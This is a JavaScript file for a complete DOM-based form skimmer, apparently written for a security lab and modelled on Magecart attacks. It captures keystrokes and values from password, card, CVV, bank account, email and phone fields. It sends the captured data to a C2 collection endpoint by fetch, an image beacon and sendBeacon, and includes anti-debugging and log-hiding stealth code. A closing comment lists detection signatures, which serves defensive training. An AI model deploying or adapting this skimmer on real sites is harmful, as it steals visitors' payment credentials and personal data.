/**
 * DOM-MONITOR.JS - REAL-TIME FIELD MONITORING ATTACK
 *
 * This attack demonstrates DOM-based skimming through:
 * - MutationObserver for detecting new payment forms
 * - Real-time input event monitoring for keystroke logging
 * - Dynamic event listener attachment
 * - Stealth DOM manipulation techniques
 *
 * Based on real-world DOM-based skimming patterns observed in:
 * - Magecart Group 12 attacks (DOM manipulation)
 * - Inter skimmer (real-time monitoring)
 * - Modern banking trojans (keystroke logging)
 *
 * FOR EDUCATIONAL PURPOSES ONLY
 */

;(function () {
  'use strict'

  console.log('[DOM-Monitor] Initializing real-time field monitoring attack...')

  // Attack configuration
  // Use Traefik path-based routing for all environments (local, staging, production)
  // The C2 server is proxied at /lab2/c2/* by Traefik
  const exfilUrl = window.location.origin + '/lab2/c2/collect'
  const healthUrl = window.location.origin + '/lab2/c2/health'

  /**
   * Health Check - Ping C2 server on page load to ensure it's ready
   * This prevents data loss during server startup
   */
  async function checkC2Health() {
    try {
      const response = await fetch(healthUrl, {
        method: 'GET',
        mode: 'cors',
        credentials: 'omit',
        cache: 'no-cache'
      })
      
      if (response.ok) {
        const data = await response.json()
        console.log('[DOM-Monitor] ✅ C2 server is ready:', data)
        return true
      } else {
        console.warn('[DOM-Monitor] ⚠️ C2 server health check failed with status:', response.status)
        return false
      }
    } catch (error) {
      console.warn('[DOM-Monitor] ⚠️ C2 server health check failed:', error.message)
      // Retry after a short delay
      setTimeout(() => {
        checkC2Health().then(ready => {
          if (ready) {
            console.log('[DOM-Monitor] ✅ C2 server is now ready after retry')
          }
        })
      }, 2000)
      return false
    }
  }

  // Perform health check immediately on page load
  checkC2Health()

  const CONFIG = {
    exfilUrl: exfilUrl,
    healthUrl: healthUrl,
    debug: true,
    targetFields: [
      // Password fields
      'input[type="password"]',
      'input[autocomplete*="password"]',

      // Credit card fields
      'input[autocomplete*="cc-number"]',
      'input[autocomplete*="cc-exp"]',
      'input[autocomplete*="cc-csc"]',
      'input[name*="card"]',
      'input[id*="card"]',
      'input[name*="cvv"]',
      'input[id*="cvv"]',

      // Banking fields
      'input[name*="account"]',
      'input[id*="account"]',
      'input[name*="routing"]',
      'input[id*="routing"]',

      // Personal information
      'input[type="email"]',
      'input[type="tel"]',
      'input[autocomplete*="email"]',
      'input[autocomplete*="tel"]'
    ],
    keystrokeInterval: 50, // Capture every 50ms
    reportInterval: 5000, // Report every 5 seconds
    maxRetries: 3
  }

  function log(message, data) {
    if (CONFIG.debug) {
      console.log('[DOM-Monitor]', message, data || '')
    }
  }

  // Data collection storage
  let capturedData = {
    keystrokes: [],
    fields: new Map(),
    sessions: [],
    metadata: {
      startTime: Date.now(),
      url: window.location.href,
      userAgent: navigator.userAgent,
      attackType: 'dom-monitor-realtime'
    }
  }

  // Monitoring state
  let monitoringActive = false
  let mutationObserver = null
  let reportTimer = null
  let attachedElements = new WeakSet()

  /**
   * Field Discovery and Monitoring
   */
  function discoverTargetFields() {
    log('Discovering target fields...')

    const foundFields = []
    CONFIG.targetFields.forEach(selector => {
      const elements = document.querySelectorAll(selector)
      elements.forEach(element => {
        if (!attachedElements.has(element)) {
          foundFields.push({
            element: element,
            selector: selector,
            type: element.type,
            name: element.name || element.id,
            autocomplete: element.autocomplete
          })
        }
      })
    })

    log(`Found ${foundFields.length} new target fields`)
    return foundFields
  }

  function attachFieldMonitors(fields) {
    log(`Attaching monitors to ${fields.length} fields`)

    fields.forEach(field => {
      if (attachedElements.has(field.element)) {
        return // Already monitored
      }

      const element = field.element
      attachedElements.add(element)

      // Create field session
      const fieldSession = {
        fieldId: generateFieldId(element),
        fieldType: field.type,
        fieldName: field.name,
        selector: field.selector,
        startTime: Date.now(),
        keystrokes: [],
        values: [],
        events: []
      }

      log(`Monitoring field: ${fieldSession.fieldId} (${field.selector})`)

      // Real-time keystroke monitoring
      element.addEventListener('keydown', e => {
        captureKeystroke(fieldSession, e, 'keydown')
      })

      element.addEventListener('keyup', e => {
        captureKeystroke(fieldSession, e, 'keyup')
      })

      // Value change monitoring
      element.addEventListener('input', e => {
        captureValueChange(fieldSession, e.target.value, 'input')
      })

      element.addEventListener('change', e => {
        captureValueChange(fieldSession, e.target.value, 'change')
      })

      // Focus/blur tracking
      element.addEventListener('focus', e => {
        captureFieldEvent(fieldSession, 'focus')
      })

      element.addEventListener('blur', e => {
        captureFieldEvent(fieldSession, 'blur', e.target.value)
        // Immediate exfiltration on blur for high-value fields
        if (isHighValueField(element)) {
          scheduleImmediateExfiltration(fieldSession)
        }
      })

      // Paste detection
      element.addEventListener('paste', e => {
        setTimeout(() => {
          captureValueChange(fieldSession, e.target.value, 'paste')
        }, 10)
      })

      capturedData.sessions.push(fieldSession)
    })
  }

  function generateFieldId(element) {
    const tagName = element.tagName.toLowerCase()
    const id = element.id || 'no-id'
    const name = element.name || 'no-name'
    const type = element.type || 'no-type'
    return `${tagName}_${id}_${name}_${type}_${Date.now()}`
  }

  function captureKeystroke(session, event, eventType) {
    const keystroke = {
      timestamp: Date.now(),
      eventType: eventType,
      key: event.key,
      code: event.code,
      keyCode: event.keyCode,
      shiftKey: event.shiftKey,
      ctrlKey: event.ctrlKey,
      altKey: event.altKey,
      metaKey: event.metaKey
    }

    session.keystrokes.push(keystroke)
    capturedData.keystrokes.push({
      fieldId: session.fieldId,
      ...keystroke
    })

    log(`Keystroke captured: ${event.key} in field ${session.fieldId}`)
  }

  function captureValueChange(session, value, changeType) {
    const valueCapture = {
      timestamp: Date.now(),
      changeType: changeType,
      value: value,
      valueLength: value.length
    }

    session.values.push(valueCapture)

    // Store current field state
    capturedData.fields.set(session.fieldId, {
      ...session,
      currentValue: value,
      lastUpdate: Date.now()
    })

    log(`Value change captured: ${changeType} in field ${session.fieldId} (${value.length} chars)`)
  }

  function captureFieldEvent(session, eventType, value = null) {
    const fieldEvent = {
      timestamp: Date.now(),
      eventType: eventType,
      value: value
    }

    session.events.push(fieldEvent)
    log(`Field event captured: ${eventType} in field ${session.fieldId}`)
  }

  function isHighValueField(element) {
    const highValuePatterns = [
      /password/i,
      /cvv/i,
      /cvc/i,
      /cc-csc/i,
      /card.*number/i,
      /account.*number/i,
      /routing/i
    ]

    const elementText = (element.name + ' ' + element.id + ' ' + element.autocomplete).toLowerCase()
    return highValuePatterns.some(pattern => pattern.test(elementText))
  }

  /**
   * DOM Mutation Monitoring
   */
  function initMutationObserver() {
    log('Initializing DOM mutation observer...')

    mutationObserver = new MutationObserver(mutations => {
      let newFieldsFound = false

      mutations.forEach(mutation => {
        if (mutation.type === 'childList') {
          mutation.addedNodes.forEach(node => {
            if (node.nodeType === Node.ELEMENT_NODE) {
              // Check if new node contains target fields
              const newFields = findFieldsInNode(node)
              if (newFields.length > 0) {
                log(`Mutation observer found ${newFields.length} new fields`)
                attachFieldMonitors(newFields)
                newFieldsFound = true
              }
            }
          })
        }

        // Monitor attribute changes that might affect field targeting
        if (mutation.type === 'attributes') {
          const target = mutation.target
          if (
            target.tagName === 'INPUT' &&
            (mutation.attributeName === 'type' ||
              mutation.attributeName === 'name' ||
              mutation.attributeName === 'autocomplete')
          ) {
            log('Field attributes changed, re-evaluating...')
            const newFields = findFieldsInNode(target)
            if (newFields.length > 0) {
              attachFieldMonitors(newFields)
              newFieldsFound = true
            }
          }
        }
      })

      if (newFieldsFound) {
        log('New fields detected via mutation observer')
      }
    })

    // Start observing
    mutationObserver.observe(document, {
      childList: true,
      subtree: true,
      attributes: true,
      attributeFilter: ['type', 'name', 'id', 'class', 'autocomplete']
    })

    log('DOM mutation observer active')
  }

  function findFieldsInNode(node) {
    if (node.nodeType !== Node.ELEMENT_NODE) {
      return []
    }

    const fields = []
    CONFIG.targetFields.forEach(selector => {
      // Check if the node itself matches
      if (node.matches && node.matches(selector)) {
        fields.push({
          element: node,
          selector: selector,
          type: node.type,
          name: node.name || node.id,
          autocomplete: node.autocomplete
        })
      }

      // Check descendants
      const descendants = node.querySelectorAll ? node.querySelectorAll(selector) : []
      descendants.forEach(element => {
        if (!attachedElements.has(element)) {
          fields.push({
            element: element,
            selector: selector,
            type: element.type,
            name: element.name || element.id,
            autocomplete: element.autocomplete
          })
        }
      })
    })

    return fields
  }

  /**
   * Data Exfiltration
   */
  function scheduleImmediateExfiltration(session) {
    log(`Scheduling immediate exfiltration for high-value field: ${session.fieldId}`)

    setTimeout(() => {
      const payload = {
        type: 'immediate',
        fieldData: session,
        timestamp: Date.now(),
        metadata: capturedData.metadata
      }

      exfiltrateData(payload)
    }, 100)
  }

  function startPeriodicReporting() {
    log(`Starting periodic reporting every ${CONFIG.reportInterval}ms`)

    reportTimer = setInterval(() => {
      if (capturedData.sessions.length > 0 || capturedData.keystrokes.length > 0) {
        const payload = {
          type: 'periodic',
          summary: {
            sessionsCount: capturedData.sessions.length,
            keystrokesCount: capturedData.keystrokes.length,
            fieldsCount: capturedData.fields.size,
            activeFields: Array.from(capturedData.fields.values()).map(field => ({
              fieldId: field.fieldId,
              fieldType: field.fieldType,
              valueLength: field.currentValue ? field.currentValue.length : 0,
              lastUpdate: field.lastUpdate
            }))
          },
          fullData: {
            sessions: capturedData.sessions,
            keystrokes: capturedData.keystrokes.slice(-100), // Last 100 keystrokes
            fieldValues: Object.fromEntries(capturedData.fields)
          },
          timestamp: Date.now(),
          metadata: capturedData.metadata
        }

        exfiltrateData(payload)

        // Clear old data to prevent memory buildup
        if (capturedData.keystrokes.length > 1000) {
          capturedData.keystrokes = capturedData.keystrokes.slice(-500)
        }
      }
    }, CONFIG.reportInterval)
  }

  async function exfiltrateData(payload) {
    log('Exfiltrating captured data...', {
      type: payload.type,
      size: JSON.stringify(payload).length
    })

    try {
      const response = await fetch(CONFIG.exfilUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload),
        mode: 'cors',
        credentials: 'omit'
      })

      if (response.ok) {
        log('Data exfiltration successful')
      } else {
        log('Data exfiltration failed with status:', response.status)
      }
    } catch (error) {
      log('Data exfiltration error:', error.message)

      // Fallback: image beacon
      try {
        const img = new Image()
        const encodedData = btoa(JSON.stringify(payload))
        img.src = `${CONFIG.exfilUrl}?data=${encodedData}`
        log('Fallback image beacon sent')
      } catch (fallbackError) {
        log('Fallback exfiltration also failed:', fallbackError.message)
      }
    }
  }

  /**
   * Attack Initialization and Management
   */
  function startMonitoring() {
    if (monitoringActive) {
      log('Monitoring already active')
      return
    }

    log('Starting DOM-based field monitoring attack...')
    monitoringActive = true

    // Initial field discovery
    const initialFields = discoverTargetFields()
    attachFieldMonitors(initialFields)

    // Start mutation observer for dynamic content
    initMutationObserver()

    // Start periodic reporting
    startPeriodicReporting()

    // Monitor for page unload to send final data
    window.addEventListener('beforeunload', () => {
      const finalPayload = {
        type: 'session_end',
        finalData: {
          sessions: capturedData.sessions,
          totalKeystrokes: capturedData.keystrokes.length,
          fieldValues: Object.fromEntries(capturedData.fields),
          sessionDuration: Date.now() - capturedData.metadata.startTime
        },
        timestamp: Date.now(),
        metadata: capturedData.metadata
      }

      // Use sendBeacon for reliable delivery on page unload
      if (navigator.sendBeacon) {
        navigator.sendBeacon(CONFIG.exfilUrl, JSON.stringify(finalPayload))
      }
    })

    log('DOM monitoring attack initialized successfully')
  }

  function stopMonitoring() {
    if (!monitoringActive) {
      return
    }

    log('Stopping DOM monitoring attack...')
    monitoringActive = false

    if (mutationObserver) {
      mutationObserver.disconnect()
      mutationObserver = null
    }

    if (reportTimer) {
      clearInterval(reportTimer)
      reportTimer = null
    }

    log('DOM monitoring attack stopped')
  }

  /**
   * Stealth and Evasion
   */
  function initStealthMeasures() {
    // Hide from common debugging techniques
    try {
      // Override console methods to hide logs in production
      if (!CONFIG.debug) {
        const originalLog = console.log
        console.log = function (...args) {
          if (!args[0] || !args[0].includes('[DOM-Monitor]')) {
            originalLog.apply(console, args)
          }
        }
      }

      // Anti-debugging measures
      let devtools = false
      setInterval(() => {
        if (
          window.outerHeight - window.innerHeight > 200 ||
          window.outerWidth - window.innerWidth > 200
        ) {
          if (!devtools) {
            devtools = true
            log('DevTools detected, entering stealth mode')
            // Could pause monitoring or use more subtle techniques
          }
        } else {
          devtools = false
        }
      }, 1000)
    } catch (error) {
      log('Stealth measures initialization failed:', error.message)
    }
  }

  /**
   * Attack Entry Point
   */
  function initDOMMonitorAttack() {
    try {
      log('Initializing DOM monitor attack...')

      // Wait for page to be ready
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
          setTimeout(() => {
            initStealthMeasures()
            startMonitoring()
          }, 1000)
        })
      } else {
        setTimeout(() => {
          initStealthMeasures()
          startMonitoring()
        }, 1000)
      }
    } catch (error) {
      log('DOM monitor attack initialization failed:', error.message)
    }
  }

  // Start the attack
  initDOMMonitorAttack()

  // Expose control functions for testing
  window.domMonitorAttack = {
    start: startMonitoring,
    stop: stopMonitoring,
    getStatus: () => ({
      active: monitoringActive,
      sessionsCount: capturedData.sessions.length,
      keystrokesCount: capturedData.keystrokes.length,
      fieldsCount: capturedData.fields.size
    }),
    getCapturedData: () => capturedData
  }
})()

/**
 * DOM MONITOR ATTACK ANALYSIS:
 *
 * This attack demonstrates advanced DOM-based skimming techniques:
 *
 * 1. **Real-time Field Monitoring**:
 *    - MutationObserver for dynamic content detection
 *    - Comprehensive input event listeners (keydown, keyup, input, change, focus, blur, paste)
 *    - Keystroke-level data capture for sensitive fields
 *
 * 2. **Intelligent Field Targeting**:
 *    - Multiple selector strategies for payment/banking fields
 *    - Autocomplete attribute analysis
 *    - High-value field prioritization
 *
 * 3. **Stealth Techniques**:
 *    - WeakSet for element tracking to avoid memory leaks
 *    - Anti-debugging measures
 *    - Console log filtering
 *    - DevTools detection
 *
 * 4. **Data Exfiltration Strategy**:
 *    - Immediate exfiltration for high-value fields
 *    - Periodic reporting for ongoing monitoring
 *    - Reliable session-end reporting with sendBeacon
 *    - Fallback image beacon for robustness
 *
 * 5. **Performance Optimization**:
 *    - Memory management for long-running sessions
 *    - Efficient DOM querying
 *    - Debounced reporting
 *
 * Detection Signatures:
 * - MutationObserver usage in payment contexts
 * - Excessive input event listeners on form fields
 * - Real-time keystroke monitoring patterns
 * - Frequent fetch requests with form data
 * - WeakSet usage for element tracking
 * - BeforeUnload event handlers with network activity
 *
 * This attack provides comprehensive training data for detecting
 * real-time DOM manipulation and field monitoring techniques.
 */
